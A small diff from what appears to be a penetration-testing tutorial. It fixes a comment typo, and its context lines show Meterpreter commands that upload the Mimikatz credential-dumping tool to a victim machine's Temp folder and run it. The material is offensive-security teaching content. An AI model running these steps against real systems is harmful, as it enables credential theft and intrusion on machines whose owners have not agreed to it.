@@ -10,7 +10,7 @@ To run Mimikatz on a victim machine, you first need to transmit the Mimikatz exe
 ```bash
 cd C:\\Windows\\Temp\\
 upload /usr/share/windows-resources/mimikatz/x64/ 
-# nce uploaded, you can execute it through the Meterpreter session
+# Once uploaded, you can execute it through the Meterpreter session
 execute -f C:\\Windows\\Temp\\mimikatz.exe
 ```
 
